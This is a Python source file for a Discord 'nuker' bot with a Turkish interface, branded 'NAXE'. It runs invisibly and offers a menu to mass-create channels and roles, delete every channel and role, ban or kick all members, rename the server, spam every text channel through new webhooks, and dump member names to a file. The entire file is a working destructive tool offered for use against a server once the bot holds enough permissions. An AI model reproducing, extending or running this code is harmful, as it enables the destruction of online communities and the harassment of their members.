import discord
import platform
from os import system
from colorama import Fore, Style

intents = discord.Intents.default()
intents.typing = True
intents.presences = True
intents.members = True

bot = discord.Client(intents=intents, status=discord.Status.offline)

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.offline)
    print('Bot hazır.')

async def delete_channels(guild):
    deleted_channels = []
    not_deleted_channels = []
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted_channels.append(channel.name)
        except discord.Forbidden:
            not_deleted_channels.append(channel.name + " (silinemedi - yetki eksik)")
    return deleted_channels, not_deleted_channels

async def delete_roles(guild):
    deleted_roles = []
    not_deleted_roles = []
    for role in guild.roles:
        if role != guild.default_role:
            try:
                await role.delete()
                deleted_roles.append(role.name)
            except discord.Forbidden:
                not_deleted_roles.append(role.name + " (silinemedi - yetki eksik)")
    return deleted_roles, not_deleted_roles

async def ban_all_members(guild):
    banned_members = []
    not_banned_members = []
    for member in guild.members:
        try:
            await member.ban()
            banned_members.append(member.name)
        except discord.Forbidden:
            not_banned_members.append(member.name + " (yasaklanamadı - yetki eksik)")
    return banned_members, not_banned_members

async def kick_all_members(guild):
    kicked_members = []
    not_kicked_members = []
    for member in guild.members:
        try:
            await member.kick()
            kicked_members.append(member.name)
        except discord.Forbidden:
            not_kicked_members.append(member.name + " (atılamadı - yetki eksik)")
    return kicked_members, not_kicked_members

async def check_bot_role_position(guild):
    bot_member = guild.me
    bot_role = bot_member.top_role
    roles = guild.roles

    for role in roles:
        if role.position > bot_role.position:
            print(f"{role.name} rolü, botun rolünden daha üstte.")
            return False
    print("Botun rolü en üst sırada.")
    return True

async def save_members(guild):
    with open("uyeler.txt", "w") as file:
        for member in guild.members:
            file.write(member.name + "\n")
            print(f"{member.name} üyesi kaydedildi.")

os = platform.system()
if os == "Windows":
    system("cls")
else:
    system("clear")
    print(chr(27) + "[2J")

def print_header():
    print("" * 60)
    print("" * 60)
    print(f"\033[38;2;255;0;0m{' '*37}███╗  ██╗ █████╗ ██╗  ██╗███████╗")
    print(f"\033[38;2;255;0;0m{' '*37}████╗ ██║██╔══██╗╚██╗██╔╝██╔════╝")
    print(f"\033[38;2;255;0;0m{' '*37}██╔██╗██║███████║ ╚███╔╝ █████╗  ")
    print(f"\033[38;2;255;0;0m{' '*37}██║╚████║██╔══██║ ██╔██╗ ██╔══╝   ")
    print(f"\033[38;2;255;0;0m{' '*37}██║ ╚███║██║  ██║██╔╝╚██╗███████╗")
    print(f"\033[38;2;255;0;0m{' '*37}╚═╝╚══╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝")
    print(f"{Style.RESET_ALL}")

async def create_channel(guild, channel_name, channel_count):
    for i in range(channel_count):
        await guild.create_text_channel(channel_name + str(i+1))

async def create_role(guild, role_name, role_count):
    for i in range(role_count):
        await guild.create_role(name=role_name + str(i+1))

async def change_server_name(guild, new_name):
    await guild.edit(name=new_name)

async def delete_all_channels(guild):
    deleted_channels, not_deleted_channels = await delete_channels(guild)
    print("\033[38;2;255;0;0mSilinen kanallar:")
    print('\n'.join(deleted_channels))
    if not_deleted_channels:
        print("\033[38;2;255;0;0mSilinmeyen kanallar:")
        print('\n'.join(not_deleted_channels))

async def delete_all_roles(guild):
    deleted_roles, not_deleted_roles = await delete_roles(guild)
    print("\033[38;2;255;0;0mSilinen roller:")
    print('\n'.join(deleted_roles))
    if not_deleted_roles:
        print("\033[38;2;255;0;0mSilinmeyen roller:")
        print('\n'.join(not_deleted_roles))

async def webhook_spam(guild, message):
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            try:
                webhook = await channel.create_webhook(name="Webhook")
                await webhook.send(message)
            except discord.Forbidden:
                print(f"{channel.name} kanalında webhook oluştururken yetkim yetmiyor.")
            except discord.HTTPException as e:
                print(f"{channel.name} kanalında webhook oluşturulurken bir hata oluştu: {e}")

def clear_console():
    if os == "Windows":
        system("cls")
    else:
        system("clear")

@bot.event
async def on_connect():
    print('Bağlanılıyor...')
    clear_console()

@bot.event
async def on_ready():
    print('Bot hazır.')
    while True:
        clear_console()
        print_header()
        print("                                 \033[38;2;255;0;0mMade İn Naxe                  Hydronix & LuX")
        print("\n")
        print("                     (1) Kanal Oluştur                         (5) Tüm Kanalları Sil")
        print("                     (2) Rol Oluştur                           (6) Tüm Rolleri Sil")
        print("                     (3) Tüm Herkesi Yasakla                   (7) Tüm Herkesi At")
        print("                     (4) Sunucu Adı Değiştir                   (8) Webhook Spam")
        print("                     (9) Üyeleri Kaydet")
        print("\n")
        print('                                          \033[38;2;255;0;0m Bot Durumu [GÖRÜNMEZ] ')
        print("\n")

        choice = input("                                 \033[38;2;255;0;0mSeçiminizi yapın (0 ana menüye dön): ")

        guild = bot.get_guild(int(sunucu_id))

        if choice == "0":
            continue
        elif choice == "1":
            channel_name = input("Kanal ismi: ")
            channel_count = int(input("Kaç kanal oluşturulsun: "))
            await create_channel(guild, channel_name, channel_count)
        elif choice == "5":
            await delete_all_channels(guild)
        elif choice == "2":
            role_name = input("Rol ismi: ")
            role_count = int(input("Kaç rol oluşturulsun: "))
            await create_role(guild, role_name, role_count)
        elif choice == "6":
            await delete_all_roles(guild)
        elif choice == "3":
            await ban_all_members(guild)
        elif choice == "7":
            await kick_all_members(guild)
        elif choice == "4":
            new_name = input("Yeni sunucu adı: ")
            await change_server_name(guild, new_name)
        elif choice == "8":
            message = input("Gönderilecek mesaj: ")
            await webhook_spam(guild, message)
        elif choice == "9":
            await save_members(guild)

print_header()
print("                                 \033[38;2;255;0;0mMade İn Naxe                  Hydronix & LuX")
token = input('\033[38;2;255;0;0m [NAXE] Bot TOKEN Girin: ')
sunucu_id = input('\033[38;2;255;0;0m [NAXE] Sunucu ID girin: ')

bot.run(token)
